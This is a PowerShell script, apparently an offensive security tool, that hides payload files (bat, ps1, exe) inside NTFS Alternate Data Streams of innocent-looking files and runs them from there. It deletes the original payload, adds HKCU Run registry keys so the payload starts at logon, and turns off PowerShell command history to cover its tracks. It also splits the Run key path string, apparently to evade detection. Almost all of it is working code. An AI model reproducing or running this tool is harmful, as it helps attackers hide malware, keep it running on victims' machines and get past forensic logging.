﻿<#
.SYNOPSIS
   Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.8
   
.DESCRIPTION
   Alternate Data Streams (ADS) have been around since the introduction
   of windows NTFS. Basically ADS can be used to hide the presence of a
   secret or malicious file inside the file record of an innocent file.

.NOTES
   Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt|.png
   This module hiddes {txt|bat|ps1|exe} $DATA inside ADS records.
   Remark: Payload.[extension] + legit.txt must be on the same dir.

.Parameter ADS
   Accepts arguments: Enum, Create, Exec and Clear (default: enum)

.Parameter StreamData
   Accepts the absolute \ relative path of Payload. [Bat | ps1 | txt | exe]
   which will be incorporated into a legitimate file ADS $DATA Stream. 

.Parameter InTextFile
   Accepts the absolute \ relative path of the legitimate file
   which will be embedded with payload.[extension] ADS $DATA Stream.

.Parameter StartDir
   This Parameters its used to reduce the recursive search time.
   If invoked -ADS 'Enum' to search for files with $DATA Streams

.Parameter Registry
   This parameter allow us to execute our payload ADS $DATA on startup

.EXAMPLE
   PS C:\> Get-Help .\AdsMasquerade.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Enum -streamdata "payload.bat" -StartDir "$Env:TMP"
   Search recursive for payload.bat ADS stream record existence, starting on -startdir 'dir'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Enum -streamdata ":" -StartDir "$Env:USERPROFILE\Desktop"
   Search recursive for ALL ADS stream records existence, starting on -startdir 'directory'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -streamdata "Payload.bat" -intextfile "legit.txt"
   Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -streamdata "Payload.bat" -intextfile "legit.png" -registry "true"
   Hidde the data of Payload.bat script inside legit.png ADS stream $DATA record and add startup registry key

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Exec -streamdata "payload.bat" -intextfile "legit.mp3"
   Execute the alternate $DATA stream of the sellected -intextfile 'file'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Clear -streamdata "Payload.bat" -intextfile "legit.txt"
   Delete payload.bat $DATA stream from legit.txt and delete ALL registry associated keys

.INPUTS
   None. You cannot pipe objects into AdsMasquerade.ps1

.OUTPUTS
   * Alternate Data Stream settings *
   [ads] LegitFile   : C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
   [ads] payloadPath : C:\Users\pedro\Coding\ADS_TUTORIAL\payload.exe
   [cmd] Execute_ADS : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"

   * Registry persistence settings *
   ADSpersistenceEXE : cmd /R wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"
   PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   PSChildName       : Run
   PSDrive           : HKCU

.LINK
   https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams
   https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams
   https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StreamData="false",
   [string]$InTextFile="false",
   [string]$StartDir="false",
   [string]$Registry="false",
   [string]$ADS="enum"
)


Write-Host ""
## Local variable declarations
$ADSDataName = $InTextFile.split('\')[-1]   ## Strip filename from path - blitzo.png
$ParseDataName = $StreamData.split('\')[-1] ## Strip filename from path - payload.exe
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($StartDir -ieq "false")
{
   #Set working dir if not set by user
   $StartDir = "$Working_Directory"
}


If($ADS -ieq "Enum")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Enum files containing payload $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe
       Remark: If -startdir its not set, then cmdlet will
       use script working directory to start search recursive.

    .EXAMPLE
        .\AdsMasquerade.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
        Search recursive for payload.bat ADS stream record existence, starting on -StartDir [ dir ]

    .EXAMPLE
        .\AdsMasquerade.ps1 -ADS Enum -StreamData ":" -StartDir "$Env:USERPROFILE\Desktop"
        Search recursive for ALL ADS stream record existence, starting on -StartDir [ dir ]

    .OUTPUTS
       Files containing payload $DATA records
       --------------------------------------
       Stream      : ZoneIdentifier.bat
       PSChildName : blitzo.png:ZoneIdentifier.bat
       FileName    : C:\Users\pedro\coding\ADS_TUTORIAL\blitzo.png
       Length      : 81
    #>

    #Check mandatory parameters settings
    If($StreamData -iMatch "false")
    {
        #Search for ALL streams
        $StreamData = ":"
    }
    If($StreamData -iMatch '\\')
    {
       ## Search in user input absoluct path
       #extract stream name from absoluct path
       $FinalQuery = ${ParseDataName}
    }
    Else
    {
       #Search in user input local path
       $FinalQuery = ${StreamData}    
    }

    try{#Start Query
       Get-ChildItem "$StartDir" -Recurse -Force -EA SilentlyContinue | % { Get-Item $_.FullName -stream * -EA SilentlyContinue | Where-Object {
          $_.PSChildName -iNotMatch '(::|Zone.Identifier)' -and $_.PSChildName -iMatch "$FinalQuery" -and $_.FullName -iNotMatch 'AppData' }
       } | Format-List Stream,PSChildName,FileName,Length > $Env:TMP\lksfdv.log
    }catch{}


    ## Make sure that the logfile exists and contains any data
    If([String]::IsNullOrEmpty((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue)) -ieq "True")
    {
        #None ADS $DATA records found!
        Write-Host "`nFiles containing payload `$DATA records"
        Write-Host "--------------------------------------"
        Write-Host "[error] Stream name not found: '$FinalQuery'"
        Write-Host "[error] None ADS `$DATA records found under: '$StartDir'"
        Write-Host "[ inf ] Imput a diferent directory where to start search recursive!`n`n" -ForegroundColor DarkGray
        Remove-Item -Path "$Env:TMP\lksfdv.log" -Force -EA SilentlyContinue
    }
    Else
    {
        #ADS $DATA records found!
        Write-Host "`nFiles containing payload `$DATA records"
        Write-Host "--------------------------------------"
        #Remove the two top lines of logfile
        (Get-Content -Path "$Env:TMP\lksfdv.log"|Select-Object -Skip 2)|Set-Content -Path "$Env:TMP\lksfdv.log"
        Get-Content -Path "$Env:TMP\lksfdv.log";Remove-Item -Path "$Env:TMP\lksfdv.log" -Force    
    }

}
ElseIf($ADS -ieq "Exec")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Execute scripts of $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
       Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

    .OUTPUTS
       Executing ADS $Data of
       ----------------------
       C:\Users\pedro\AppData\Local\Temp\legit.txt
    #>

    #Make sure -intextfile 'path' exists
    If(-not(Test-Path -Path $InTextFile -EA SilentlyContinue))
    {
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "[error] Not found: '$InTextFile'" -ForegroundColor Red -BackgroundColor Black
        Write-Host "`n`n";exit ## Exit @AdsMasquerade    
    }

    ## Make sure legit.txt contains any ADS $DATA
    # If yes then set -StartDir variable to -InTextFile
    $RawPath = $InTextFile -replace "\\${ADSDataName}",""
    $CheckAds = Get-ChildItem "$InTextFile" -EA SilentlyContinue | % { gi $_.FullName -stream * } |
        Where-Object Stream -ieq "${ParseDataName}" | Select-Object -ExpandProperty Stream


    If($CheckAds -ieq "$ParseDataName")
    {
        If($InTextFile -Match '\\')
        {
           ## Check for Absoluct Path inputs
           $StartDir = $RawPath
        }
        Else
        {
           ## Required files are in current directory
           $StartDir = $Working_Directory
        }
    }
    Else
    {
       ## Required Dependencies NOT meet
       Write-Host "Executing ADS `$Data of"
       Write-Host "----------------------"
       Write-Host "[error] $ADSDataName does not contain any ADS `$DATA!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "`n`n";exit ## Exit @AdsMasquerade
    }


    If($ParseDataName -Match '.txt$')
    {
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "$InTextFile`n`n" -ForegroundColor Green
        Start-Process notepad.exe ${InTextFile}:${ParseDataName}
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "$InTextFile`n`n" -ForegroundColor Green
        ## Nice trick to be abble to execute cmd stdin { < } on PS 
        cmd.exe /c "cmd.exe - < ${InTextFile}:${ParseDataName}"

    }
    ElseIf($ParseDataName -Match '.ps1$')
    {
        $RawLegit = $InTextFile.Split('\\')[-1]                      # blitzo.png
        $RawPayloadPath = $StreamData.Split('\\')[-1]                # Update-KB5005101.ps1
        $LegitPath = $InTextFile -replace "\\${RawLegit}",""         # C:\Users\pedro\Coding\ADS_TUTORIAL
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "$InTextFile`n`n" -ForegroundColor Green
        cd $LegitPath;powershell .\${RawLegit}:${RawPayloadPath}
        cd $Working_Directory

    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "$InTextFile`n`n" -ForegroundColor Green
        ## TODO: Replace wmic.exe syscall by Start-Proces?
        # Start-Process -WindowStyle hidden wmic.exe -ArgumentList "process", "call", "create ${InTextFile}:${ParseDataName}" -EA SilentlyContinue|Out-Null
        wmic.exe process call create "${InTextFile}:${ParseDataName}"
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        Write-Host "Executing ADS `$Data of"
        Write-Host "----------------------"
        Write-Host "$InTextFile`n`n" -ForegroundColor Green
        wmplayer.exe "${InTextFile}:${ParseDataName}"
    }

}
ElseIf($ADS -ieq "Create")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
       Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

    .OUTPUTS
       * Alternate Data Stream settings *
       [ads] LegitFile   : C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
       [ads] PayloadPath : C:\Users\pedro\Coding\ADS_TUTORIAL\payload.exe
       [cmd] Execute_ADS : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"

       * Registry persistence settings *
       ADSpersistenceEXE : cmd /R wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"
       PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
       PSChildName       : Run
       PSDrive           : HKCU
    #>

    $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
    ## Make sure payload.bat and legit.exe are in the same dir
    # If yes then set -StartDir variable to -InTextFile directory
    If($InTextFile -Match '\\')
    {
       #Check for user Absoluct Path inputs
       $CheckLegit = $InTextFile -replace "\\${ADSDataName}",""
       $CheckPaylo = $StreamData -replace "\\${ParseDataName}",""
    }
    Else
    {
       #Required files are in current directory
       $CheckLegit = $Working_Directory
       $CheckPaylo = $Working_Directory
    }

    If($CheckLegit -ieq "$CheckPaylo")
    {
        #The two files are present
        If($CheckLegit -Match '\\')
        {
           #Set -StartDir to -InTextFile directory
           $StartDir = $CheckLegit
        }
        Else
        {
           #Required files are in current directory
           $StartDir = $Working_Directory
        }

    }
    Else
    {
       #Required Dependencies NOT meet
       echo "`nAlternateDataStream" > $Env:TMP\kbfdjk.log
       echo "-------------------" >> $Env:TMP\kbfdjk.log
       Get-Content $Env:TMP\kbfdjk.log;Remove-Item $Env:TMP\kbfdjk.log -Force
       Write-Host "[error] " -ForegroundColor Red -BackgroundColor Black -NoNewline;
       Write-Host "$ADSDataName" -ForegroundColor DarkGray -BackgroundColor Black -NoNewline;
       Write-Host " and " -ForegroundColor Red -BackgroundColor Black -NoNewline;
       Write-Host "$ParseDataName" -ForegroundColor DarkGray -BackgroundColor Black -NoNewline;
       Write-Host " must be in the same directory!" -ForegroundColor Red -BackgroundColor Black;
       Write-Host "`n";exit ## Exit @AdsMasquerade
    }


    #Check if legit text file exists
    If(Test-Path -Path "$InTextFile" -EA SilentlyContinue)
    {
        ## * Hidde Payload data inside text file ADS $DATA stream ^_^ * ##
        Set-Content -Path "$InTextFile" -Value $(Get-Content -Path "$StreamData") -Stream $ParseDataName
    }
    Else
    {
       ## Error legit text file not found
       Write-Host "`nAlternateDataStream"
       Write-Host "-------------------"
       Write-Host "[error] Not found: $InTextFile" -ForegroundColor Red -BackgroundColor Black
       Write-Host "n`n";exit ## Exit @AdsMasquerade
    }


    ## Building the output Tables
    If($ParseDataName -Match '.ps1$')
    {
        ## Powershell output Table
        $RawLegit = $InTextFile.Split('\\')[-1]                      # blitzo.png
        $RawPayloadPath = $StreamData.Split('\\')[-1]                # Update-KB5005101.ps1
        $LegitPath = $InTextFile -replace "\\${RawLegit}",""         # C:\Users\pedro\Coding\ADS_TUTORIAL
        write-host "`n* Alternate Data Stream settings *"
        write-host "[ads] LegitFile   : $InTextFile" -ForegroundColor DarkGray
        write-host "[ads] payloadPath : $StreamData" -ForegroundColor DarkGray
        write-host "[cmd] Execute_ADS : cd $LegitPath&&powershell .\${RawLegit}:${RawPayloadPath}" -ForegroundColor Green

        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "cmd /R `"cd $LegitPath&&powershell .\${RawLegit}:${RawPayloadPath}`"" -PropertyType String -Force|Select-Object ADSpersistencePS,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        #Batch output Table
        write-host "`n* Alternate Data Stream settings *"
        write-host "[ads] LegitFile   : $InTextFile" -ForegroundColor DarkGray
        write-host "[ads] PayloadPath : $StreamData" -ForegroundColor DarkGray
        write-host "[cmd] Execute_ADS : cmd.exe - < ${InTextFile}:${ParseDataName}" -ForegroundColor Green

        #Delete payload.bat
        Remove-Item -Path "$StreamData" -Force

        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceBAT' -Value "cmd /R `"cmd.exe - < ${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceBAT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.txt$')
    {
        #Text file output Table
        write-host "`n* Alternate Data Stream settings *"
        write-host "[ads] LegitFile   : $InTextFile" -ForegroundColor DarkGray
        write-host "[ads] payloadPath : $StreamData" -ForegroundColor DarkGray
        write-host "[cmd] Execute_ADS : cmd /c notepad.exe ${InTextFile}:${ParseDataName}" -ForegroundColor Green

        #Delete payload.txt
        Remove-Item -Path "$StreamData" -Force

        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceTXT' -Value "cmd /R notepad.exe ${InTextFile}:${ParseDataName}" -PropertyType String -Force|Select-Object ADSpersistenceTXT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        #Binary.exe output Table
        write-host "`n* Alternate Data Stream settings *"
        write-host "[ads] LegitFile   : $InTextFile" -ForegroundColor DarkGray
        write-host "[ads] PayloadPath : $StreamData" -ForegroundColor DarkGray
        write-host "[cmd] Execute_ADS : wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" -ForegroundColor Green

        #Delete payload.exe
        Remove-Item -Path "$StreamData" -Force

        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceEXE' -Value "cmd /R wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceEXE,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        #Filename.mp3 output Table
        Write-Host "`n* Alternate Data Stream settings *"
        Write-Host "[ads] LegitFile   : $InTextFile" -ForegroundColor DarkGray
        Write-Host "[ads] PayloadPath : $StreamData" -ForegroundColor DarkGray
        Write-Host "[cmd] Execute_ADS : wmplayer.exe `"${InTextFile}:${ParseDataName}`"" -ForegroundColor Green

        #Delete payload.mp3
        Remove-Item -Path "$StreamData" -Force

        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceMP3' -Value "cmd /R wmplayer.exe `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceMP3,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }

}
ElseIf($ADS -ieq "Clear")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Delete payload $DATA stream form file records (ADS)

    .NOTES
       This function deletes $DATA streams of sellected file and ALL
       registry keys added to HKCU/../RUN hive by previous functions.

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
       Delete payload.bat ADS $DATA stream from legit.txt text file records

    .OUTPUTS
       Clean AlternateDataStream
       -------------------------
       Stream      : :$DATA
       PSChildName : blitzo.png
       FileName    : C:\Users\pedro\coding\ADS_TUTORIAL\blitzo.png
       Status      : ZoneIdentifier.bat Stream $DATA cleared!
       Status      : Cleanning registry associated keys!

       Deleted registry keys
       ---------------------
       deleted     : HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ADSpersistenceBAT
    #>

    #Make sure -intextfile 'path' exists
    If(Test-Path $InTextFile -EA SilentlyContinue)
    {
        #Start Query - Build report logfile
        Get-ChildItem "$InTextFile" | % { gi $_.FullName -stream * } |
            Where-Object Stream -ieq "${ParseDataName}" |
            Format-List Stream,PSChildName,FileName > $Env:TMP\gfscgsvs.log

        #Make sure gfscgsvs.log exists
        If(Test-Path -Path "$Env:TMP\gfscgsvs.log" -EA SilentlyContinue)
        {
            #Make sure gfscgsvs.log contains any $DATA stream
            $Msopcads = Get-Content -Path "$Env:TMP\gfscgsvs.log"
            If($Msopcads -Match "$ParseDataName")
            {
                ## * Delete payload $DATA stream from text file ^_^ * ##
                Remove-Item -Path "$InTextFile" -Stream $ParseDataName -EA SilentlyContinue -Force

                #Build Output Table
                write-host "`nClean AlternateDataStream"
                write-host "-------------------------"
                write-host "Stream      : :`$DATA"
                write-host "PSChildName : $ADSDataName"
                write-host "FileName    : $InTextFile" -ForegroundColor Green
                write-host "Status      : $ADSDataName Stream `$DATA cleared!"
                write-host "Status      : Cleanning registry associated keys!`n`n"
            }
            Else
            {
                #Error: logfile does NOT contain any $DATA streams!
                Write-Host "Clean AlternateDataStream"
                Write-Host "-------------------------"
                Write-Host "[error] logfile does NOT contain any `$DATA streams!" -ForegroundColor Red -BackgroundColor Black
                Write-Host "`n`n"
            }
        }
        Else
        {
            #Error: logfile not found!
            Write-Host "Clean AlternateDataStream"
            Write-Host "-------------------------"
            Write-Host "[error] logfile not found!" -ForegroundColor Red -BackgroundColor Black
            Write-Host "`n`n"
        }
    }
    Else
    {
        ## -InTextFile NOT found error
        Write-Host "Clean AlternateDataStream"
        Write-Host "-------------------------"
        Write-Host "[error] Not found: $InTextFile" -ForegroundColor Red -BackgroundColor Black
        Write-Host "`n`n"
    }

    Write-Host "Deleted registry keys"
    Write-Host "---------------------"
    #Delete ALL registry keys added previously by this cmdlet
    $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''

    #Define the type of the reg Value
    If($StreamData -iMatch '(.ps1)$')
    {
       $vALUEiTEM = "ADSpersistencePS"
    }
    ElseIf($StreamData -iMatch '(.bat)$')
    {
       $vALUEiTEM = "ADSpersistenceBAT"    
    }
    ElseIf($StreamData -iMatch '(.txt)$')
    {
       $vALUEiTEM = "ADSpersistenceTXT"    
    }
    ElseIf($StreamData -iMatch '(.exe)$')
    {
       $vALUEiTEM = "ADSpersistenceEXE"    
    }
    ElseIf($StreamData -iMatch '(.mp3)$')
    {
       $vALUEiTEM = "ADSpersistenceMP3"    
    }

    #Check for registry key existence { Value Name }
    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch "$vALUEiTEM" }
    If($CheckReg)
    {
       #Deleting sellected registry key by is value name
       Write-Host "deleted     : $path1\$vALUEiTEM" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "$vALUEiTEM" -ErrorAction SilentlyContinue -Force    
    }  

    ## None registry keys found ..
    #{ associated with the Payload extension user sellection }
    If(-not($CheckReg) -or $CheckReg -ieq $null)
    {
       Write-Host "None registry associated keys found .." -ForegroundColor Red -BackgroundColor Black
    }

}